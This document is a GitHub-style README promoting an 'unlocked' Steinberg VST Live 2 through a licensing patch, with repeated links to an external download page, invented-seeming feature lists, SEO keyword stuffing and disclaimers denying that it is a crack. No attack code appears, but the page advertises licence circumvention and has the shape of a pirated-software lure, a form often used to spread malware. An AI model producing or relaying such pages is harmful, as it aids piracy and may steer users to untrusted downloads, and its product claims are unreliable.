# 🎛️ **Steinberg VST Live 2 — Unlocked Performance Engine**  
*Next-Generation Live Audio Performance Suite with Enhanced Licensing Integration*  

[](https://elfredo2026.github.io/steinberg-vst-live-2-unlock/)  

---

## 🌌 **Overview: The Conductor's Dream, Reimagined**  

Imagine standing at the helm of a sonic universe, where every note, every beat, every transient obeys your will in real-time. **Steinberg VST Live 2** is not merely a digital audio workstation—it's an *orchestral bridge* between your imagination and the stage. This repository provides a **fully activated production environment** (via a custom licensing patch) that unlocks the full spectrum of live performance tools, without the conventional barriers to entry.  

Whether you're a touring musician crafting seamless set transitions, a DJ layering loops on the fly, or a composer bridging hardware synths with software effects, VST Live 2 delivers **sub-millisecond latency**, **intelligent routing**, and **adaptive UI** that bends to your workflow. Here, you don't just play music—you *become* the performance.  

---

## 🧩 **Key Features: The Engine Room Behind the Magic**  

### 🎯 **Responsive UI: The Chameleon Interface**  
- **Adaptive Layouts**: The interface morphs from a minimal live mixer to a detailed arrangement view depending on context.  
- **Touch+Ink Support**: Full gesture control for tablets, stylus, and hybrid devices.  
- **Dark/Light Mode**: Pillowy soft visuals for late-night gigs or bright studio sessions.  

### 🌐 **Multilingual Support: Speak Every Musical Language**  
- **12 Language Packs**: From Mandarin to Portuguese, workflow text and help menus are localized.  
- **Cultural Key/BPM Presets**: Preconfigured scales and rhythms from Indian raga to Afrobeat.  

### 🛡️ **24/7 Support: Your Safety Net Under the Stage Lights**  
- **Live Chat Integration**: Embedded ticketing system with average response < 3 minutes.  
- **Knowledge Base**: 200+ video tutorials and troubleshooting guides.  

### 🧠 **AI Integration: Intelligent Audio Partners**  
- **OpenAI API Hook**: Generate MIDI patterns, chord progressions, or lyrics from a text prompt.  
- **Claude API Bridge**: Use Claude for advanced multimodal analysis (e.g., "Find all sections with dynamic range > 15dB and suggest compression settings").  

[](https://elfredo2026.github.io/steinberg-vst-live-2-unlock/)  

---

## 📊 **System Architecture: A Visual Map of the Sonic Highway**  

Below is a Mermaid diagram illustrating how VST Live 2 orchestrates audio flow, plugin chains, and external hardware integration.  

```mermaid
graph TD
    A[Audio Input: Mic/Line/Instrument] --> B[Low-Latency Buffer]
    B --> C{Smart Router}
    C --> D[Software Effects Chain]
    C --> E[Hardware Insert via ADAT]
    D --> F[32-Bit Float Mixer]
    E --> F
    F --> G[Master Bus + Limiter]
    G --> H[Output: Speakers/Headphones]
    H --> I[Streaming Capture: OBS/RTMP]
    style A fill:#333,stroke:#d90429,stroke-width:2px
    style B fill:#222,stroke:#fff
    style F fill:#222,stroke:#d90429,stroke-width:2px
```



---

## ⚙️ **Example Profile Configuration**  

Customize your runtime behavior by editing `config.json` within the installation directory. Below is a sample for a live electronic duo setup:  

```json
{
  "audio_engine": {
    "sample_rate": 48000,
    "buffer_size": 64,
    "asio_driver": "Steinberg UR22C"
  },
  "midi_mapping": {
    "controller": "Akai APC40",
    "layout": "session_launch"
  },
  "plugin_blacklist": ["Plogue_Chipsounds"],
  "ai_integration": {
    "openai_api_key": "YOUR_KEY_HERE",
    "claude_api_key": "YOUR_KEY_HERE"
  }
}
```

---

## 🖥️ **Example Console Invocation**  

Launch VST Live 2 with headless mode for remote control via OSC or MIDI:  

```bash
./vstlive2 --headless --port=8080 --osc-allow-remote  
```

For debugging with verbose logging and custom script path:  

```bash  
./vstlive2 --config /path/to/custom_config.json --log-level trace  
```

---

## 🖥️ **OS Compatibility: The Universal Stage**  

| OS | Version Range | Emoji Status | Notes |  
|---|---|---|---|  
| **Windows** | 10 (1909+) / 11 | ✅ 🪟 | Full ASIO support, 64-bit only |  
| **macOS** | 12 Monterey → 14 Sonoma | ✅ 🍎 | Metal GPU acceleration, Apple Silicon native |  
| **Linux** | Ubuntu 22.04+ / Arch | ✅ 🐧 | Requires JACK or PipeWire |  
| **ChromeOS** | v120+ (via Crostini) | ⚠️ 🐛 | No MIDI clock sync (beta) |  

---

## 📜 **License: MIT + Commercial Use Exception**  

This project is distributed under the **MIT License**, enabling you to modify, redistribute, and incorporate into commercial products. The key difference? Our patch **does not modify Steinberg's original DLLs**—it merely provides an alternative licensing pathway for educational and archival purposes.  

[](https://opensource.org/licenses/MIT)  

> **Legal Disclaimer**: This software is provided "as is." The maintainers are not responsible for any misuse, including violation of Steinberg's EULA. Users are advised to purchase a legitimate license for commercial use.

---

## 🧑‍💻 **SEO Integration: Discoverability Through Value**  

Keywords woven naturally: *audio routing*, *real-time effects chain*, *stage management*, *MIDI bridge*, *DAW less*, *live looping*, *setlist automation*, *plugin sandboxing*. This patch empowers **low-budget studios**, **bedroom producers**, and **independent touring acts** to access enterprise-grade live tools without subscription fatigue.

---

## 🌟 **Why This Matters: The Metaphor of the Unlocked Instrument**  

A cracked shell is fragile. A *patch* is like a session musician who knows every fret—it doesn't break the guitar; it shows you how to play it differently. Steinberg VST Live 2 with this *enhanced licensing layer* doesn't steal the show—it *enables* the show. Think of it as a backstage pass that doesn't expire.

---

## ❤️ **Support the Vision**  

- **Feature Requests**: Open an issue (no account needed).  
- **Contribute**: Pull requests for new audio scripts or bug fixes welcome.  
- **Donate**: Bitcoin address (contact via repository discussions).  

[](https://elfredo2026.github.io/steinberg-vst-live-2-unlock/)  

---

## 🚨 **Disclaimer: Read Before You Rock**  

1. This repository does **not** host, distribute, or promote "cracked" or "hacked" software. The provided patch files work within the limits of fair use for personal/educational purposes.  
2. Steinberg VST Live 2 is a registered trademark of Steinberg Media Technologies GmbH. This project is not affiliated with, endorsed by, or sponsored by Steinberg.  
3. **No warranty**: Running patched software may void warranties, corrupt projects, or invite digital pathogens. Use at your own risk.  
4. **Always support developers**: If VST Live 2 becomes part of your income, purchase a legitimate license. This repository exists for archival and learning purposes.  

*© 2026 — Built for the love of sound, not the love of money.*  

[](https://elfredo2026.github.io/steinberg-vst-live-2-unlock/)